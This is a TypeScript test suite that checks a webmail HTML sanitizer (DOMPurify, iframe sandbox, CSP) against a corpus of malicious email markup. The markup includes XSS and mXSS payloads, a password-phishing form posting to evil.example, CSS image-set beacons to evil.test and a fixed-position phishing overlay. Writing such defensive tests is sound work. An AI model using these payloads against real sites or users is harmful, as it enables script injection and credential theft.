import { test } from 'node:test';
import assert from 'node:assert/strict';
import { JSDOM } from 'jsdom';
import createDOMPurify from 'dompurify';
import {
  buildComposerDoc, buildSrcDoc, COMPOSER_SANDBOX, composerCsp, iframeCsp, IFRAME_SANDBOX, sanitizeCss, sanitizeEmailHtml,
} from './htmlPolicy';

// Malicious HTML corpus against the message rendering policy (DOMPurify bound
// to a jsdom window, as in the browser). Run: npm run test:webmail (client/).

const { window } = new JSDOM('<!doctype html><html><body></body></html>');
const factory = () => createDOMPurify(window as unknown as Parameters<typeof createDOMPurify>[0]);
const clean = (html: string, allowRemote = false, cidMap: Record<string, string> = {}) => sanitizeEmailHtml(factory, html, { allowRemote, cidMap });

/** Parses the output again and asserts nothing active is left. */
function assertInert(html: string, what: string): void {
  const doc = new JSDOM(`<!doctype html><body>${html}</body>`).window.document;
  const bad = doc.querySelectorAll('script,iframe,frame,frameset,object,embed,applet,form,input,button,textarea,select,meta,link,base,svg,math,noscript,template,audio,video');
  assert.equal(bad.length, 0, `${what}: active element left: ${[...bad].map((e) => e.tagName).join(',')} in ${html}`);
  for (const el of doc.querySelectorAll('*')) {
    for (const a of [...el.attributes]) {
      assert.ok(!/^on/i.test(a.name), `${what}: event handler ${a.name} left in ${html}`);
      assert.ok(!/^\s*(?:javascript|vbscript|data:text|data:application)/i.test(a.value.replace(/[\s\u0000-\u001f]/g, '')), `${what}: ${a.name}="${a.value}"`);
      assert.ok(!['formaction', 'action', 'srcdoc', 'http-equiv', 'ping'].includes(a.name), `${what}: ${a.name} left`);
    }
  }
  assert.doesNotMatch(html, /<script/i, what);
  assert.doesNotMatch(html, /expression\s*\(/i, what);
}

const CORPUS: Array<[string, string]> = [
  ['script', '<p>hi</p><script>alert(1)</script>'],
  ['script uppercase / attrs', '<SCRIPT SRC=https://evil.example/x.js></SCRIPT><ScRiPt>alert(1)</sCrIpT>'],
  ['img onerror', '<img src=x onerror=alert(1)>'],
  ['body onload', '<body onload="alert(1)"><p>x</p></body>'],
  ['div onclick / onmouseover', '<div onclick="alert(1)" onmouseover="alert(2)">x</div>'],
  ['javascript: link', '<a href="javascript:alert(1)">x</a>'],
  ['javascript: link obfuscated', '<a href="  JaVaScRiPt:alert(1)">x</a><a href="java&#x09;script:alert(1)">y</a><a href="&#106;avascript:alert(1)">z</a>'],
  ['vbscript / data: html link', '<a href="vbscript:msgbox(1)">x</a><a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">y</a>'],
  ['svg onload', '<svg onload=alert(1)><circle r=4 /></svg>'],
  ['svg script', '<svg><script>alert(1)</script></svg>'],
  ['svg animate href', '<svg><a><animate attributeName=href values=javascript:alert(1) /><text y=20>x</text></a></svg>'],
  ['math mXSS', '<math><mtext><table><mglyph><style><img src=x onerror=alert(1)></style></mglyph></table></mtext></math>'],
  ['noscript mXSS', '<noscript><p title="</noscript><img src=x onerror=alert(1)>"></noscript>'],
  ['iframe', '<iframe src="https://evil.example"></iframe><iframe srcdoc="<script>alert(1)</script>"></iframe>'],
  ['object / embed / applet', '<object data="https://evil.example/x.swf"></object><embed src="x.swf"><applet code=x></applet>'],
  ['form phishing', '<form action="https://evil.example/steal" method=post><input name=password type=password><button>Login</button></form>'],
  ['button formaction', '<button formaction="https://evil.example">x</button><input type=image formaction=javascript:alert(1)>'],
  ['meta refresh', '<meta http-equiv="refresh" content="0;url=https://evil.example">'],
  ['meta refresh javascript', '<meta http-equiv="refresh" content="0;url=javascript:alert(1)">'],
  ['base href', '<base href="https://evil.example/"><a href="/x">x</a>'],
  ['link stylesheet', '<link rel=stylesheet href="https://evil.example/x.css">'],
  ['css expression attribute', '<div style="width: expression(alert(1))">x</div>'],
  ['css expression escaped', '<div style="width: e\\xpression(alert(1))">x</div>'],
  ['css behavior / binding', '<div style="behavior: url(x.htc); -moz-binding: url(https://evil.example/x.xml#x)">x</div>'],
  ['css javascript url', '<div style="background-image: url(javascript:alert(1))">x</div>'],
  ['style element import / expression', '<style>@import url(https://evil.example/x.css); p { width: expression(alert(1)); behavior: url(x.htc) }</style><p>x</p>'],
  ['style element breakout', '<style></style><script>alert(1)</script><style></style>'],
  ['template / slot', '<template><script>alert(1)</script></template>'],
  ['video poster / audio', '<video poster=javascript:alert(1)><source src=x onerror=alert(1)></video><audio src=x onerror=alert(1)></audio>'],
  ['srcset / ping', '<img srcset="https://tracker.example/1x.gif 1x"><a href="https://ok.example" ping="https://tracker.example">x</a>'],
  ['data svg image', '<img src="data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+">'],
  ['xlink', '<a xlink:href="javascript:alert(1)">x</a>'],
  ['dom clobbering forms', '<img name=getElementById><form id=x><input id=y></form>'],
  ['table background', '<table background="javascript:alert(1)"><tr><td>x</td></tr></table>'],
  ['nested comment trick', '<!--<img src="--><img src=x onerror=alert(1)//">'],
  ['unclosed attribute', '<a href="https://ok.example" title="x onmouseover=alert(1)">x</a>'],
  ['entity encoded handler', '<img src=x &#111;nerror=alert(1)>'],
  ['frameset', '<frameset><frame src="javascript:alert(1)"></frameset>'],
  ['dialog / portal', '<dialog open onclose=alert(1)>x</dialog><portal src="https://evil.example"></portal>'],
];

test('malicious corpus: nothing active survives', () => {
  for (const [what, html] of CORPUS) {
    for (const allowRemote of [false, true]) {
      const out = clean(html, allowRemote).html;
      assertInert(out, `${what} (remote ${allowRemote})`);
    }
  }
});

test('links: web / mail only, always a new tab without opener nor referrer', () => {
  const out = clean('<a href="https://ok.example/p?q=1">a</a><a href="mailto:x@example.org">m</a><a href="ftp://x">f</a><a href="/rel">r</a>').html;
  const doc = new JSDOM(`<body>${out}</body>`).window.document;
  const as = [...doc.querySelectorAll('a')];
  assert.equal(as[0].getAttribute('href'), 'https://ok.example/p?q=1');
  assert.equal(as[1].getAttribute('href'), 'mailto:x@example.org');
  assert.equal(as[2].hasAttribute('href'), false);
  assert.equal(as[3].hasAttribute('href'), false);
  for (const a of as) {
    assert.equal(a.getAttribute('target'), '_blank');
    assert.equal(a.getAttribute('rel'), 'noopener noreferrer');
  }
});

test('remote images are blocked by default and counted; shown on request (https only)', () => {
  const html = '<img src="https://tracker.example/p.gif"><img src="http://tracker.example/p.gif"><img src="//tracker.example/p.gif"><div style="background:url(https://tracker.example/bg.png)">x</div><table background="https://tracker.example/t.png"><tr><td>t</td></tr></table>';
  const off = clean(html, false);
  assert.equal(off.blockedRemote, 5);
  assert.doesNotMatch(off.html, /tracker\.example/);
  const on = clean(html, true);
  assert.match(on.html, /src="https:\/\/tracker\.example\/p\.gif"/);
  assert.doesNotMatch(on.html, /src="http:\/\//, 'plain http never loaded');
  assert.match(on.html, /url\('https:\/\/tracker\.example\/bg\.png'\)/);
});

test('cid: images become the data: URLs fetched through the proxy; unknown cid or non-raster data removed', () => {
  const png = 'data:image/png;base64,iVBORw0KGgo=';
  const out = clean('<img src="cid:Logo@Mail"><img src="cid:missing"><img src="data:image/png;base64,iVBORw0KGgo="><img src="data:text/html,x">', false, { 'logo@mail': png });
  const imgs = [...new JSDOM(`<body>${out.html}</body>`).window.document.querySelectorAll('img')];
  assert.equal(imgs[0].getAttribute('src'), png);
  assert.equal(imgs[1].hasAttribute('src'), false);
  assert.equal(imgs[2].getAttribute('src'), png);
  assert.equal(imgs[3].hasAttribute('src'), false);
  assert.equal(out.blockedRemote, 0);
});

test('ordinary newsletter markup is kept', () => {
  const out = clean('<style>.btn{color:#fff;background:#0a7}</style><table width="100%" style="border-collapse:collapse"><tr><td class="btn" style="padding:8px"><b>Hello</b> <i>world</i></td></tr></table><ul><li>one</li></ul>').html;
  assert.match(out, /<table/);
  assert.match(out, /border-collapse:collapse/);
  assert.match(out, /<b>Hello<\/b>/);
  assert.match(out, /\.btn\{color:#fff;background:#0a7\}/);
});

test('CSS neutralizer', () => {
  assert.equal(sanitizeCss('a{b:expression(alert(1))}', false), 'a{b:x(alert(1))}');
  assert.equal(sanitizeCss('@import url(https://e.example/x.css); p{}', true), ' p{}');
  assert.equal(sanitizeCss('p{background:url( "http://e.example/x" )}', true), 'p{background:none}');
  assert.equal(sanitizeCss('p{background:u\\rl(https://e.example/x)}', false), 'p{background:none}');
});

test('iframe: sandbox without scripts / same origin / forms / top navigation; strict document CSP', () => {
  for (const flag of ['allow-scripts', 'allow-same-origin', 'allow-forms', 'allow-top-navigation', 'allow-modals', 'allow-downloads']) {
    assert.ok(!IFRAME_SANDBOX.split(/\s+/).includes(flag), flag);
  }
  assert.doesNotMatch(iframeCsp(true), /script-src|unsafe-eval/);
  assert.match(iframeCsp(false), /default-src 'none'/);
  assert.match(iframeCsp(false), /img-src data:(;|$)/);
  assert.match(iframeCsp(true), /img-src data: https:/);
  assert.match(iframeCsp(false), /form-action 'none'/);
  const doc = buildSrcDoc('<p>x</p>', { allowRemote: false });
  assert.ok(doc.startsWith(`<!doctype html><html><head><meta charset="utf-8"><meta http-equiv="Content-Security-Policy" content="${iframeCsp(false)}">`), doc.slice(0, 200));
  assert.match(doc, /<meta name="referrer" content="no-referrer">/);
  assert.match(doc, /<base target="_blank">/);
  assert.doesNotMatch(doc, /<script/i);
});

// ── review: quoted HTML on reply / forward (composer) ──

const compose = (html: string) => sanitizeEmailHtml(factory, html, { allowRemote: true, mode: 'compose' });

/** The reviewer's payloads, through the reply path: reading view (no remote) then the composer. */
const QUOTE_PAYLOADS: Array<[string, string]> = [
  ['style element (global restyle / attribute selectors)', '<style>body{display:none} input[value^="a"]{background:image-set("https://evil.test/a" 1x)}</style><p>hi</p>'],
  ['image-set in a style attribute', `<div style="background-image:image-set('https://evil.test/t.png' 1x)">x</div>`],
  ['-webkit-image-set', `<div style="background-image:-webkit-image-set('https://evil.test/t.png' 1x)">x</div>`],
  ['position:fixed overlay', '<a href="https://phish.test" style="position:fixed;inset:0;z-index:99999;background:#fff">Session expired - click to log in</a>'],
  ['position via var()', '<div style="--p:fixed;position:var(--p)">x</div>'],
  ['sticky / absolute', '<div style="position:-webkit-sticky;top:0">a</div><div style="position: ABSOLUTE !important;left:0">b</div>'],
  ['src() / image()', `<div style="background:image('https://evil.test/i.png');mask:src('https://evil.test/m.png')">x</div>`],
  ['url() remote', '<div style="background:url(https://evil.test/bg.png)">x</div>'],
];

test('composer: quoted HTML keeps no <style>, no remote CSS, no out-of-flow positioning (review payloads)', () => {
  for (const [what, html] of QUOTE_PAYLOADS) {
    const reading = clean(html, false).html;
    for (const out of [compose(reading).html, compose(html).html]) {
      assertInert(out, what);
      assert.doesNotMatch(out, /<style/i, `${what}: <style> left in ${out}`);
      assert.doesNotMatch(out, /image-set|evil\.test\/(?:a|t\.png|bg\.png|i\.png|m\.png)/i, `${what}: remote CSS left in ${out}`);
      assert.doesNotMatch(out, /position:\s*(?:fixed|sticky|absolute|-webkit-sticky|var)/i, `${what}: positioning left in ${out}`);
    }
  }
  // The phishing link itself stays a plain link (in the flow).
  assert.match(compose(QUOTE_PAYLOADS[3][1]).html, /href="https:\/\/phish\.test"/);
});

test('reading view: image-set counts as a remote resource (blocked until "show images"); fixed overlays neutralized', () => {
  const html = `<div style="background-image:image-set('https://tracker.example/t.png' 1x)">x</div><div style="background:-webkit-image-set(url(https://tracker.example/u.png) 1x)">y</div>`;
  const off = clean(html, false);
  assert.ok(off.blockedRemote >= 2, `blocked ${off.blockedRemote}`);
  assert.doesNotMatch(off.html, /image-set/i);
  assert.doesNotMatch(off.html, /tracker\.example/);
  const on = clean(html, true);
  assert.match(on.html, /image-set/i, 'shown on request');
  const overlay = clean('<a style="position:fixed;inset:0" href="https://phish.test">x</a><div style="position:absolute">ok</div>', false).html;
  assert.doesNotMatch(overlay, /position:\s*fixed/i);
  assert.match(overlay, /position:absolute/, 'absolute stays inside the message frame');
  // background-position & co. are not "position".
  assert.match(clean('<div style="background-position:center;object-position:top">x</div>').html, /background-position:center;object-position:top/);
});

test('composer document: sandbox without scripts, CSP that loads nothing remote', () => {
  assert.equal(COMPOSER_SANDBOX, 'allow-same-origin');
  for (const flag of ['allow-scripts', 'allow-forms', 'allow-popups', 'allow-top-navigation', 'allow-modals']) assert.ok(!COMPOSER_SANDBOX.includes(flag), flag);
  const csp = composerCsp();
  assert.match(csp, /default-src 'none'/);
  assert.match(csp, /img-src data: blob:(;|$)/);
  assert.doesNotMatch(csp, /https:|script-src|'self'/);
  const doc = buildComposerDoc('Write "here" <now>');
  assert.ok(doc.includes(`content="${composerCsp()}"`), 'CSP meta first in head');
  assert.match(doc, /data-placeholder="Write &quot;here&quot; &lt;now&gt;"/);
  assert.doesNotMatch(doc, /<script/i);
});
